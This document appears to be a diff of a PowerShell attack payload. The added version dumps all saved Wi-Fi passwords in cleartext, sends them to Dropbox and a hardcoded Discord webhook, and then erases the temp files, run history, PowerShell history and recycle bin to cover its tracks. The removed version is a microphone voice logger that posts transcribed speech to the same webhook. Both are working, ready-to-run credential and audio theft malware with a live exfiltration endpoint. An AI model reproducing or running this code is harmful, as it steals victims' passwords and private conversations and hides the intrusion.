@@ -1,50 +1,82 @@
-function DC-Upload {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0, Mandatory=$False)]
-        [string]$text 
-    )
+############################################################################################################################################################
 
-    $dc = 'https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3'
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
-    $Body = @{
-        'username' = $env:username
-        'content'  = $text
-    }
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
 
-    if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
-    }
+############################################################################################################################################################
+
+# Upload output file to Dropbox
+
+function DropBox-Upload {
+
+[CmdletBinding()]
+param (
+	
+[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
+[Alias("f")]
+[string]$SourceFilePath
+) 
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-function voiceLogger {
-    Add-Type -AssemblyName System.Speech
-    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $recognizer.LoadGrammar($grammar)
-    $recognizer.SetInputToDefaultAudioDevice()
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
 
-    $log = "$env:TEMP\VoiceLog.txt"
+############################################################################################################################################################
 
-    while ($true) {
-        $result = $recognizer.Recognize()
-        if ($result) {
-            $results = $result.Text
-            Write-Output $results
-            $results | Set-Content -Path $log
-            $text = Get-Content $log -Raw
-            DC-Upload $text
+function Upload-Discord {
 
-            switch -regex ($results) {
-                '\bnote\b' {Start-Process notepad}
-                '\bexit\b' {break}
-            }
-        }
-    }
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
 
-    if (Test-Path $log) {
-        Clear-Content -Path $log
-    }
+$hookurl = "https://discord.com/api/webhooks/1264728039682740356/RjUIrKfIKnpBH3npIAWT-M7YZ0KfwCzVmkgGp8yF2Bv3hagAgVVdSucimNeswCoiStR3"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
 }
 
-voiceLogger
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+
+############################################################################################################################################################
+
+function Clean-Exfil { 
+
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+}
+
+############################################################################################################################################################
+
+if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
+
+RI $env:TEMP/--wifi-pass.txt
